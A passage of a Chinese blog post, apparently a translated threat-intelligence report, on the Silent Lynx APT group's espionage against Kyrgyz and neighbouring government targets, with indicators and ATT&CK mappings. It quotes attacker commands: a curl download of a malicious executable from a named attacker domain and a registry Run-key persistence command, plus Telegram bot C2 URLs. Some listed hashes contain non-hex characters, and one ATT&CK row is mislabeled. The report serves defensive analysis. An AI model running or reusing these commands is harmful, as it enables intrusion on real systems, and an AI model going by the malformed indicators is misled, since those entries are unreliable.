+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" srcset="/img/loading.gif" lazyload data-original="/2025/01/22/%E6%8F%AD%E7%A7%98-%E2%80%9C%E6%B2%89%E9%BB%98%E5%B1%B1%E7%8C%AB%E2%80%9D%EF%BC%88Silent-Lynx%EF%BC%89%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81%E7%BB%84%E7%BB%87%EF%BC%9A%E9%92%88%E5%AF%B9%E5%90%89%E5%B0%94%E5%90%89%E6%96%AF%E6%96%AF%E5%9D%A6%E5%8F%8A%E5%91%A8%E8%BE%B9%E5%9B%BD%E5%AE%B6%E7%9A%84%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/image-20250122105913-vnsxp3c.png" class="" title="image-20250122105913-vnsxp3c">
+
+
+<p>我们还发现了一个有趣的情况，威胁行为者（TA）从一个网络服务器下载恶意有效载荷，并在被攻陷的系统上建立持久化机制。通过命令 “cmd &#x2F;c curl -o c:\users\public\gservice.exe hxxps:&#x2F;&#x2F;<a target="_blank" rel="noopener" href="https://pweobmxdlboi.com/147.exe">pweobmxdlboi.com&#x2F;147.exe</a>” ，威胁行为者从远程服务器下载了一个恶意可执行文件，并将其保存为 “c:\users\public” 目录下的 “gservice.exe”。</p>
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" srcset="/img/loading.gif" lazyload data-original="/2025/01/22/%E6%8F%AD%E7%A7%98-%E2%80%9C%E6%B2%89%E9%BB%98%E5%B1%B1%E7%8C%AB%E2%80%9D%EF%BC%88Silent-Lynx%EF%BC%89%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81%E7%BB%84%E7%BB%87%EF%BC%9A%E9%92%88%E5%AF%B9%E5%90%89%E5%B0%94%E5%90%89%E6%96%AF%E6%96%AF%E5%9D%A6%E5%8F%8A%E5%91%A8%E8%BE%B9%E5%9B%BD%E5%AE%B6%E7%9A%84%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/image-20250122105940-m2wj05s.png" class="" title="image-20250122105940-m2wj05s">
+
+<p>为确保持久化，威胁行为者执行了一个注册表修改命令：“REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Run &#x2F;v WinUpTask &#x2F;t REG_SZ &#x2F;d c:\users\public\gservice.exe&#x2F;f”，该命令将可执行文件添加到 Windows 的 “运行” 键中，这样每当用户登录时，它就会自动启动。随后，攻击者使用 “REG query” 命令来验证修改，并通过消息 “Операция успешно завершена”（“操作已成功完成”）确认持久化机制已成功建立。</p>
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" srcset="/img/loading.gif" lazyload data-original="/2025/01/22/%E6%8F%AD%E7%A7%98-%E2%80%9C%E6%B2%89%E9%BB%98%E5%B1%B1%E7%8C%AB%E2%80%9D%EF%BC%88Silent-Lynx%EF%BC%89%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81%E7%BB%84%E7%BB%87%EF%BC%9A%E9%92%88%E5%AF%B9%E5%90%89%E5%B0%94%E5%90%89%E6%96%AF%E6%96%AF%E5%9D%A6%E5%8F%8A%E5%91%A8%E8%BE%B9%E5%9B%BD%E5%AE%B6%E7%9A%84%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/image-20250122105951-9j456kb.png" class="" title="image-20250122105951-9j456kb">
+
+<p>据信，其中一名受感染的受害者与土库曼斯坦和吉尔吉斯斯坦之间的外交行动密切相关。存在敏感文件，如 “Turkmenistanyn Gyrgyz Respublikasyndaky Ilcihanasynyn meyilnamasy.docx”，这表明攻击者以该受害者为目标，收集有关外交计划和关系的情报，这意味着此次活动的主要目标之一是进行间谍活动，而且目标不仅限于银行，还包括其他政府机构。</p>
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" srcset="/img/loading.gif" lazyload data-original="/2025/01/22/%E6%8F%AD%E7%A7%98-%E2%80%9C%E6%B2%89%E9%BB%98%E5%B1%B1%E7%8C%AB%E2%80%9D%EF%BC%88Silent-Lynx%EF%BC%89%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81%E7%BB%84%E7%BB%87%EF%BC%9A%E9%92%88%E5%AF%B9%E5%90%89%E5%B0%94%E5%90%89%E6%96%AF%E6%96%AF%E5%9D%A6%E5%8F%8A%E5%91%A8%E8%BE%B9%E5%9B%BD%E5%AE%B6%E7%9A%84%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/image-20250122110009-8tldd1q.png" class="" title="image-20250122110009-8tldd1q">
+
+<p>在追踪同一威胁行为者（实际上是同一操作员，使用相同的 Telegram 用户）发起的其他活动时，我们发现该威胁行为者还使用了其他基于 Telegram 的机器人，对同一地理位置的不同受害者发动攻击。</p>
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" srcset="/img/loading.gif" lazyload data-original="/2025/01/22/%E6%8F%AD%E7%A7%98-%E2%80%9C%E6%B2%89%E9%BB%98%E5%B1%B1%E7%8C%AB%E2%80%9D%EF%BC%88Silent-Lynx%EF%BC%89%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81%E7%BB%84%E7%BB%87%EF%BC%9A%E9%92%88%E5%AF%B9%E5%90%89%E5%B0%94%E5%90%89%E6%96%AF%E6%96%AF%E5%9D%A6%E5%8F%8A%E5%91%A8%E8%BE%B9%E5%9B%BD%E5%AE%B6%E7%9A%84%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/image-20250122110021-elogymc.png" class="" title="image-20250122110021-elogymc">
+
+<p>此外，我们发现威胁行为者一直在使用一个名为 resocks 的红队开源工具，该工具被托管在他们的基础设施中。</p>
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" srcset="/img/loading.gif" lazyload data-original="/2025/01/22/%E6%8F%AD%E7%A7%98-%E2%80%9C%E6%B2%89%E9%BB%98%E5%B1%B1%E7%8C%AB%E2%80%9D%EF%BC%88Silent-Lynx%EF%BC%89%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81%E7%BB%84%E7%BB%87%EF%BC%9A%E9%92%88%E5%AF%B9%E5%90%89%E5%B0%94%E5%90%89%E6%96%AF%E6%96%AF%E5%9D%A6%E5%8F%8A%E5%91%A8%E8%BE%B9%E5%9B%BD%E5%AE%B6%E7%9A%84%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/image-20250122110027-t5ztuly.png" class="" title="image-20250122110027-t5ztuly">
+
+
+<p>威胁行为者托管恶意植入程序的域名如下：</p>
+<table>
+<thead>
+<tr>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>hxxps:[&#x2F;&#x2F;]pweobmxdlboi[.]com</td>
+</tr>
+<tr>
+<td>hxxps:[&#x2F;&#x2F;]document[.]hometowncity[.]cloud</td>
+</tr>
+<tr>
+<td>hxxps:[&#x2F;&#x2F;]mailboxdownload[.]com</td>
+</tr>
+</tbody></table>
+<p>进一步追踪发现，威胁行为者还利用 Google Drive 将更多有效载荷下载到受害者系统中，目前依赖于 C++、MSIL 植入程序。这些植入程序要么嵌入了恶意 PowerShell 脚本，要么从诸如 Pastebin 之类的文本共享服务下载，并且在最近的活动中依赖 Telegram 进行数据渗出和命令与控制服务 。</p>
+<h1 id="归因分析"><a href="#归因分析" class="headerlink" title="归因分析"></a>归因分析</h1><p>在描述一个威胁行为者或组织时，归因分析是一项至关重要的指标。它涉及分析和关联多个领域，包括战术、技术和程序（TTPs）、代码相似性和重用情况、威胁行为者的动机，有时还包括操作失误。</p>
+<p>在我们对 “沉默山猫”（Silent Lynx）的持续追踪过程中，发现它与一个总部位于哈萨克斯坦的威胁行为者 &#x2F; 组织（被思科 Talos 团队识别为 YoroTrooper）存在显著的相似之处和重叠部分。让我们来探讨一下 “沉默山猫” 和 YoroTrooper 之间的一些关键重叠点。</p>
+<ul>
+<li><strong>工具库</strong>：思科 Talos 的研究人员观察到，YoroTrooper 经常修改和更换其工具集，以此创建一种伪反检测机制。在 YoroTrooper 最近的行动中，对基于 PowerShell 的工具存在严重依赖。同样，“沉默山猫” 也表现出对 PowerShell 工具的高度依赖，并且在两组的代码中观察到了重叠部分。</li>
+<li><strong>动机</strong>：“沉默山猫” 和 YoroTrooper 有着相似的动机，主要都是针对吉尔吉斯斯坦及其邻国的政府机构进行间谍活动。</li>
+</ul>
+<p>除了这些例子之外，还有其他有力的相似之处进一步证实了这两个威胁组织之间的联系。我们有中等程度的把握认为，“沉默山猫” 是一个起源于哈萨克斯坦的威胁行为者，很可能与 YoroTrooper 共享资源，因此可将其定位为一个以哈萨克斯坦为导向的威胁组织。</p>
+<h1 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h1><p>“沉默山猫” 的攻击活动展示了一种复杂的多阶段攻击策略，使用了 ISO 文件、C++ 加载器、PowerShell 脚本和 Golang 植入程序。他们对 Telegram 机器人的依赖，用于命令和控制，再加上诱饵文档以及针对特定区域的攻击，突出了他们在中亚和 SPECA 成员国进行间谍活动的重点。“沉默山猫” 与 YoroTrooper 的重叠表明了资源共享，进一步证实了其作为一个来自哈萨克斯坦的威胁组织的归因。</p>
+<h3 id="入侵检测指标（IOCs）"><a href="#入侵检测指标（IOCs）" class="headerlink" title="入侵检测指标（IOCs）"></a>入侵检测指标（IOCs）</h3><table>
+<thead>
+<tr>
+<th>文件类型</th>
+<th>文件名</th>
+<th>SHA-256</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>EXE</td>
+<td>147.exe</td>
+<td>efb700681713cd50a2addd1fea6b7ee80c084467d3e87668688b9f06642062ba</td>
+</tr>
+<tr>
+<td>EXE</td>
+<td>Xerox_Scan17510875802718752175.exe</td>
+<td>e6f76a73180b4f2947764f4de57b52d037b482ecela88dab9d3290e76be8c098</td>
+</tr>
+<tr>
+<td>EXE</td>
+<td>14789.exe</td>
+<td>3560660162f2268d52b69382c78192667a7eee5796d77418a8609b2f1709f834</td>
+</tr>
+<tr>
+<td>EXE</td>
+<td>resocks.exe</td>
+<td>297d1afa309cdf0c84f04994ffd59eele1175377c1a0a561eb25869909812c9c</td>
+</tr>
+<tr>
+<td>ISO</td>
+<td>20241228_140656.iso</td>
+<td>c045344b23fc245f35a0ff4a6d6fa744d580cde45c8cd0849153dee7dce1d80c</td>
+</tr>
+<tr>
+<td>EXE</td>
+<td>Приложение №14 - 214 - 14 - 12 - 5 - 15docx</td>
+<td>1b76931775aa4de29df27a9de764b22f17ca117d6e5ae184f4ef617c970fc007</td>
+</tr>
+<tr>
+<td>EXE</td>
+<td>sokcs.exe</td>
+<td>66294c9925ad454d5640f4fe753da9e7d6742f60b093ed97be88fcdd47b04445</td>
+</tr>
+<tr>
+<td>EXE</td>
+<td>udadd.exe</td>
+<td>99c6017c8658faf678f1b171c8eb5d5fa7e7d08e0a0901b984a8e3e1fab565cd</td>
+</tr>
+<tr>
+<td>域名 &#x2F; URL</td>
+<td>hxxps:&#x2F;&#x2F;<a target="_blank" rel="noopener" href="https://pweobmxdlboi.com/">pweobmxdlboi.com</a></td>
+<td></td>
+</tr>
+<tr>
+<td>域名 &#x2F; URL</td>
+<td>hxxps:&#x2F;&#x2F;document.hometowncity.cloud</td>
+<td></td>
+</tr>
+<tr>
+<td>域名 &#x2F; URL</td>
+<td>hxxps:&#x2F;&#x2F;<a target="_blank" rel="noopener" href="https://mailboxdownload.com/">mailboxdownload.com</a></td>
+<td></td>
+</tr>
+<tr>
+<td>域名 &#x2F; URL</td>
+<td>hxxps:&#x2F;&#x2F;<a target="_blank" rel="noopener" href="https://api.telegram.org/bot8171872935:AAHLoudjpHz1bxA26bV5wPuOFL3LOHE160k">api.telegram.org&#x2F;bot8171872935:AAHLoudjpHz1bxA26bV5wPuOFL3LOHE160k</a></td>
+<td></td>
+</tr>
+<tr>
+<td>域名 &#x2F; URL</td>
+<td>hxxps:&#x2F;&#x2F;<a target="_blank" rel="noopener" href="https://api.telegram.org/bot7898508392:AAF5FPbJ1jlPQfqCIGnx">api.telegram.org&#x2F;bot7898508392:AAF5FPbJ1jlPQfqCIGnx</a> - zNdw2R5tF_Xxt0</td>
+<td></td>
+</tr>
+</tbody></table>
+<h3 id="MITRE-ATT-CK-框架相关信息"><a href="#MITRE-ATT-CK-框架相关信息" class="headerlink" title="MITRE ATT&amp;CK 框架相关信息"></a>MITRE ATT&amp;CK 框架相关信息</h3><table>
+<thead>
+<tr>
+<th>策略</th>
+<th>技术 ID 及名称</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>侦察</td>
+<td>T1589.002：收集受害者身份信息：电子邮件地址</td>
+</tr>
+<tr>
+<td>侦察</td>
+<td>T1204.002：（文档未明确此技术具体内容）</td>
+</tr>
+<tr>
+<td>初始访问</td>
+<td>T1078.002：用户执行：恶意文件（有效账户：域账户）</td>
+</tr>
+<tr>
+<td>执行</td>
+<td>T1059.001：命令和脚本解释器：PowerShell</td>
+</tr>
+<tr>
+<td>持久化</td>
+<td>T1547.001：注册表运行键 &#x2F; 启动文件夹</td>
+</tr>
+<tr>
+<td>凭证访问</td>
+<td>T1056.001：输入捕获：键盘记录</td>
+</tr>
+<tr>
+<td>凭证访问</td>
+<td>T1552.001：未受保护的凭证：文件中的凭证</td>
+</tr>
+<tr>
+<td>发现</td>
+<td>T1087：账户发现</td>
+</tr>
+<tr>
+<td>发现</td>
+<td>T1083：文件和目录发现</td>
+</tr>
+<tr>
+<td>发现</td>
+<td>T1046：网络服务发现</td>
+</tr>
+<tr>
+<td>发现</td>
+<td>T1012：查询注册表</td>
+</tr>
+<tr>
+<td>发现</td>
+<td>T1018：远程系统发现</td>
+</tr>
+<tr>
+<td>发现</td>
+<td>T1016：系统网络配置发现</td>
+</tr>
+<tr>
+<td>发现</td>
+<td>T1007：系统服务发现</td>
+</tr>
+<tr>
+<td>收集</td>
+<td>T1560.001：归档收集的数据：通过实用工具进行归档</td>
+</tr>
+<tr>
+<td>渗出</td>
+<td>T1567.002：渗出到云存储</td>
+</tr>
+</tbody></table>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/APT/" class="category-chain-item">APT</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/APT/" class="print-no-link">#APT</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>揭秘 “沉默山猫”（Silent Lynx）高级持续威胁组织：针对吉尔吉斯斯坦及周边国家的恶意攻击</div>
+      <div>http://example.com/2025/01/22/揭秘-“沉默山猫”（Silent-Lynx）高级持续威胁组织：针对吉尔吉斯斯坦及周边国家的恶意攻击/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>Jentle</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>January 22, 2025</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/01/23/Exploit-Sets/" title="Exploit Sets">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Exploit Sets</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/12/06/%E9%93%B6%E7%8B%90%E6%BA%90%E7%A0%81%E8%A7%A3%E8%AF%BB-%E6%A0%B8%E5%BF%83%E7%BB%84%E4%BB%B6%E6%A8%A1%E5%9D%97/" title="银狐源码解读--核心组件模块">
+                        <span class="hidden-mobile">银狐源码解读--核心组件模块</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      var light = 'github-light';
+      var dark = 'github-dark';
+      var schema = document.documentElement.getAttribute('data-user-color-scheme');
+      if (schema === 'dark') {
+        schema = dark;
+      } else {
+        schema = light;
+      }
+      window.UtterancesThemeLight = light;
+      window.UtterancesThemeDark = dark;
+      var s = document.createElement('script');
+      s.setAttribute('src', 'https://utteranc.es/client.js');
+      s.setAttribute('repo', 'Hipepper/UtterancBlog');
+      s.setAttribute('issue-term', 'pathname');
+      
+      s.setAttribute('label', 'utterances');
+      
+      s.setAttribute('theme', schema);
+      s.setAttribute('crossorigin', 'anonymous');
+      document.getElementById('comments').appendChild(s);
+    })
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  <script>
+  Fluid.utils.createScript('https://lib.baomitu.com/mermaid/8.14.0/mermaid.min.js', function() {
+    mermaid.initialize({"theme":"default"});
+
+    Fluid.utils.listenDOMLoaded(function() {
+      Fluid.events.registerRefreshCallback(function() {
+        if ('mermaid' in window) {
+          mermaid.init();
+        }
+      });
+    });
+  });
+</script>
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://github.com/Hipepper" target="_blank" rel="nofollow noopener"><span>Github</span></a> <i class="iconfont icon-love"></i> <a href="https://mp.weixin.qq.com/s/WZSeu6y5ckuo958f-yV3Kg" target="_blank" rel="nofollow noopener"><span>公众号</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
